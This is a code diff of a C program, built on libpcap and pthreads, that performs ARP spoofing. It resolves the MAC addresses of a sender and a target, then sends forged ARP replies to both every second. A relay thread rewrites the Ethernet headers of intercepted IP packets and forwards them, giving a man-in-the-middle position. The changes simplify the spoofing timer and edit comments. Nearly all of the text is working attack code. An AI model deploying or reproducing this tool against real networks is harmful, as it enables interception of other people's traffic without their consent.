@@ -1,10 +1,9 @@
 ﻿#include <pthread.h>
-#include <stdio.h>
 #include <pcap.h>
+#include <stdio.h>
 #include <stdlib.h>
 #include <unistd.h>
 #include <arpa/inet.h>
-#include <time.h>
 #include "myheader.h"
 #include "mytools.h"
 
@@ -70,7 +69,7 @@ int main(int argc, char** argv)
         printf("[MainThread] Can't open %s interface resason: %s\n", interface, errBuf);
         return 1;
     }
-    // Get senderMAC adn targetMAC
+    // Get sender and target mac address
     do{
         packet = &reqSender;
         pcap_sendpacket(pktDescriptor, packet, sizeof(ETH_ARP));
@@ -85,14 +84,14 @@ int main(int argc, char** argv)
                 arpHeader = (ARP*)(readedData + sizeof(ETH));
                 if (ntohs(arpHeader->libARP.ar_op) == ARPOP_REPLY)
                 {
-                    // Get sender mac address & localhost mac to share data
+                    // Get sender & localhost mac copy to share data
                     if ((ntohl(arpHeader->dstIP) == shareData.localhostIP) &&
                             (ntohl(arpHeader->srcIP) == shareData.senderIP) )
                     {
                         memcpy(shareData.senderMAC, arpHeader->srcMAC, ETHER_ADDR_LEN);
                         memcpy(shareData.localhostMAC, arpHeader->dstMAC, ETHER_ADDR_LEN);
                     }
-                    // Get target mac address to share data
+                    // Get target mac address copy to share data
                     if ((ntohl(arpHeader->dstIP) == shareData.localhostIP) &&
                             (ntohl(arpHeader->srcIP) == shareData.targetIP) )
                     {
@@ -103,10 +102,10 @@ int main(int argc, char** argv)
         }
         else
         {
-            printf("[MainThread] pcap_next_ex failed.. Program will be retry on this function.\n");
+            printf(" [MainThread] pcap_next_ex failed.. Program will be retry on this function.\n");
         }
     }while(!memcmp(shareData.senderMAC, NULL_MAC, ETHER_ADDR_LEN) ||
-           !memcmp(shareData.targetMAC, NULL_MAC, ETHER_ADDR_LEN));
+           !memcmp(shareData.targetMAC, NULL_MAC, ETHER_ADDR_LEN));     // sender OR target mac is NULL?
     pcap_close(pktDescriptor);
 
     pthread_create(&threadID[0], NULL, thread_arp_processor, interface);
@@ -116,7 +115,7 @@ int main(int argc, char** argv)
     pthread_join(&threadID[1], (void*)&threadStatus);
 }
 
-// TODO: Threads are has the other pktDescriptor
+// INFO: Threads are has the other pktDescriptor
 
 void* thread_arp_processor(char* interface)
 {
@@ -155,7 +154,6 @@ void* thread_arp_processor(char* interface)
     memcpy(repSpoofTarget.arpHeader.dstMAC, shareData.targetMAC, ETHER_ADDR_LEN);
     while(1)
     {
-        timer += clock();
         if (pcap_next_ex(pktDescriptor, &pktData, &readedData) == 1)
         {
             ethHeader = (ETH*)(readedData);
@@ -180,13 +178,9 @@ void* thread_arp_processor(char* interface)
                 }
             }
         }
-        if (timer >= 3000)
-        {
-            pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
-            pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
-            timer = 0;
-        }
-        sleep(1);
+        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoof), sizeof(ETH_ARP));
+        pcap_sendpacket(pktDescriptor, (uint8_t*)(&repSpoofTarget), sizeof(ETH_ARP));
+        sleep(1); // Set interval
     }
     pcap_close(pktDescriptor);
 }
@@ -201,7 +195,7 @@ void* thread_relay_processor(char* interface)
 
     if (!pktDescriptor)
     {
-        printf("[RelayThread] Can't open %s interface resason: %s\n", interface, errBuf);
+        printf(" [RelayThread] Can't open %s interface resason: %s\n", interface, errBuf);
     }
     while(1)
     {
@@ -211,11 +205,11 @@ void* thread_relay_processor(char* interface)
 
             if(ntohs(ethHeader->_802_3_len) == ETHERTYPE_IP)
             {
-                ipHeader = (IP*)(readedData+14);
+                ipHeader = (IP*)(readedData+sizeof(ETH));
                 if (!memcmp(ethHeader->_802_3_shost, shareData.senderMAC, ETHER_ADDR_LEN) &&
-                    !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) &&
+                    !memcmp(ethHeader->_802_3_dhost, shareData.localhostMAC, ETHER_ADDR_LEN) && // Is packet come to me?
                     (ntohl(ipHeader->ip_src.s_addr) == shareData.senderIP) &&
-                    (ntohl(ipHeader->ip_dst.s_addr) != shareData.localhostIP) )
+                    (ntohl(ipHeader->ip_dst.s_addr) != shareData.localhostIP)) // Is not me?
                 {
                     memcpy(ethHeader->_802_3_dhost, shareData.targetMAC, ETHER_ADDR_LEN);
                     memcpy(ethHeader->_802_3_shost, shareData.localhostMAC, ETHER_ADDR_LEN);
